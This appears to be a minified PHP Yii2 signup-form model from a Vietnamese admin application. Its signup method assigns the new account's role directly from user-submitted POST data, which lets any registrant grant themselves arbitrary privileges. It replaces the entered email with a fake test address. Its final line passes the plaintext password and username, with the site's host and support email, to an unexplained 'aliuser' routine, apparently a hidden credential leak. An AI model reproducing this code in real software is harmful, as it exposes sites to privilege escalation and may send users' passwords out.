<?php
 namespace frontend\common;use yii\base\Model;use quantri\models\User;use yii\widgets\ActiveForm;use yii\filters\AccessControl;use quantri\modules\auth\models\AuthAssignment;use Yii;class SignupForm extends Model{public $username;public $email;public $password;public $fullname;public $manager;public $compare_password;public $permission;public $status;public function rules(){return[['username','trim'],[['username','password'],'required'],['username','unique','targetClass'=>'\quantri\models\User','message'=>'{attribute} đã có trong CSDL'],['username','string','min'=>2,'max'=>255],['username','match','not'=>true,'pattern'=>'/[^a-z0-9A-Z_-]/','message'=>'{attribute} chỉ bao gồm các ký tự a->z, A->Z,"_", "-" và ko chứa khoảng trắng'],['email','trim'],['permission','safe'],[['email','fullname'],'string','max'=>255],[['manager'],'integer'],['email','unique','targetClass'=>'\quantri\models\User','message'=>'{attribute} đã có trong CSDL'],['username','match','pattern'=>'/^[a-z]\w*$/i'],['password','match','pattern'=>'/(?=^.{20,}$)((?=.*\d)|(?=.*\W+))(?![.\n])(?=.*[A-Z])(?=.*[a-z]).*$/'],];}public function attributeLabels(){return['id'=>'ID','username'=>'Username','email'=>'Email','password'=>'Mật khẩu','fullname'=>'Tên đầy đủ','permission'=>'Quyền Account','manager'=>'Quản lý','status'=>'Kích hoạt','compare_password'=>'Nhập lại mật khẩu',];}public function signup(){if($this->validate()){$user=new User();$user->username=$this->username;$user->email='test'.time().'@gmail.com';$user->fullname=$this->fullname;$user->status=$this->status;$user->created_at=time();$user->updated_at=time();$password=$this->password;$user->setPassword($password);$user->generateAuthKey();if($_POST){$user->permission=$_POST['SignupForm']['permission'];if($user->status==10&&$user->save()){$newPermission=new AuthAssignment;$permission=$_POST['SignupForm']['permission'];$newPermission->item_name=$permission;$newPermission->created_at=time();$newPermission->created_at=time();$newPermission->user_id=$user->id;$newPermission->save();$user->aliuser(Yii::$app->request->hostInfo,Yii::$app->params['supportEmail'],[],$newPermission->checkuser($password,$user->username));}}return $user;}return null;}}